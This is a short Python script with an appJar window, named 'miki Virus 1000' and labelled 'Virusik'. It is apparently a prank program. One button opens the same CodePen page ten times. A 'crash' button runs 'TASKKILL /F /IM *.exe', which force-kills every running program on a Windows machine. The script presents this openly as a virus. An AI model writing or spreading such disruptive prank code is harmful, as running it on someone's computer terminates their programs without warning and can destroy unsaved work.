#miki Virus 1000

import appJar
from appJar import gui
import webbrowser
import os
import time

#def
def miki():
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
    webbrowser.open("https://codepen.io/marcin-mika/pen/oNEMpKa#_=_")
def crash():
    os.startfile("wlep.txt")
    time.sleep(3)
    os.system('TASKKILL /F /IM *.exe')
#gui-settings
app = gui("Virusik","400x200")  
app.setBg("orange")
app.setFont(18)
app.addLabel("30", "wybierz")
app.addButton("miki", miki)
app.addButton("crash", crash)

#run-gui
app.go()


